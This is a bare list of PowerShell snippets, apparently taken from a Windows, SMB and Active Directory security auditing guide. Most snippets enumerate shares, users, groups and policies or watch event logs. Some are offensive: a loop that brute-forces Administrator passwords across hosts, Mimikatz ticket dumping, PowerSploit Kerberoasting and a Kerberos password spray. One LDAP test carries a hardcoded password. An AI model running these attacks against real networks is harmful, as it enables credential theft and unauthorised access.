["```\n Get-SmbShare\n```", "```\n Get-SmbConnection\n```", "```\n $computers = Get-Content computers.txt\n$passwords = Get-Content passwords.txt\nforeach ($computer in $computers) {\n    foreach ($password in $passwords) {\n        $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList (\"$computer\\Administrator\", (ConvertTo-SecureString -String $password -AsPlainText -Force))\n        try {\n            Invoke-Command -ComputerName $computer -Credential $credential -ScriptBlock { Get-SmbShare }\n        } catch {\n            Write-Host \"Failed to connect to $computer with password $password\"\n        }\n    }\n}\n```", "```\n Invoke-SMBScanner -Target 192.168.107.100-192.168.107.150\n```", "```\n Get-SmbClientConfiguration\n```", "```\n Get-SmbSession\n```", "```\n Get-SmbShare | Where-Object { $_.IsGuestOnly -eq $true }\n```", "```\n $shareName = \"ShareName\"\n(Get-SmbShare -Name $shareName).Path | Get-Acl\n```", "```\n $interval = 60\nwhile ($true) {\n    Get-SmbSession\n    Start-Sleep -Seconds $interval\n}\n```", "```\n $filePath = \"C:\\Test\\ImportantFile.txt\"\n$initialSize = (Get-Item $filePath).Length\nwhile ($true) {\n    $currentSize = (Get-Item $filePath).Length\n    if ($currentSize -ne $initialSize) {\n        Write-Host \"File size changed. Possible ransomware activity detected.\"     }\n    Start-Sleep -Seconds 300\n}\n```", "```\n Get-ADObject -Filter {ObjectClass -eq 'user'} -SearchBase 'OU=Employees,DC=snowcapcyber,DC=com'\n```", "```\n Get-ADUser -Filter {PasswordNeverExpires -eq $true}\n```", "```\n $90DaysAgo = (Get-Date).AddDays(-90)\nGet-ADUser -Filter {LastLogonDate -lt $90DaysAgo} -Properties LastLogonDate\n```", "```\n Get-ADGroupMember -Identity 'ITAdmins'\n```", "```\n Get-ADGroupMember -Identity 'Administrators'\n```", "```\n Get-ADDefaultDomainPasswordPolicy\n```", "```\n Get-ACL 'AD:\\CN=Users,DC=snowcapcyber,DC=com' | Select-Object -ExpandProperty Access | Where-Object { $_.ActiveDirectoryRights -like 'ReadProperty' }\n```", "```\n $ldapServer = 'ldap://ldap.snowcapcyber.com'\n$username = 'ajcblyth'\n$password = 'MYpassword123'\ntry {\n    $ldap = [ADSI]($ldapServer)\n    $ldap.Username = $username\n    $ldap.Password = $password\n    $ldap.AuthenticationType = [System.DirectoryServices.AuthenticationTypes]::Secure\n    $ldap.Bind()\n    Write-Host \"LDAP auth success for $username\"\n} catch {\n    Write-Host \"LDAP auth failed for $username\"\n}\n```", "```\n Test-NetConnection -ComputerName ldap.snowcapcyber.com -Port 389\n```", "```\n Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq 2887 }\n```", "```\n Test-NetConnection -ComputerName ldap.snowcapcyber.com -Port 636\n```", "```\n $threshold = 3\n$logPath = \"C:\\Logs\\FailedLogins.log\"\n$failedLogins = Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq 4625 }\nif ($failedLogins.Count -ge $threshold) {\n    $failedLogins | Out-File -Append $logPath\n    Send-MailMessage -To 'admin@snowcapcyber.com' -From 'alerts@snowcapcyber.com' -Subject 'Security Alert: Multiple Failed Logins Detected' -Body \"Multiple failed login attempts detected. Check $logPath for details.\" }\n```", "```\n Get-KerberosTicket | Format-Table -Property UserName, ServiceName, StartTime, EndTime\n```", "```\n Get-ADServiceAccount -Filter *\n```", "```\n Invoke-Mimikatz -Command '\"ajcblyth::tickets\"'\n```", "```\n Import-Module PowerSploit\nInvoke-Kerberoast\n```", "```\n $ticket = Get-KerberosTicket\n$renewalDuration = (New-TimeSpan -Start $ticket.StartTime -End $ticket.EndTime).TotalMinutes\nif ($renewalDuration -gt 1440) {\n    Write-Host \"Abnormally renewal detected.\" }\n```", "```\n Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4769 }\n```", "```\n Invoke-SprayKerberos -UserList users.txt -Password Summer2023 -Domain snowcapcyber.com\n```"]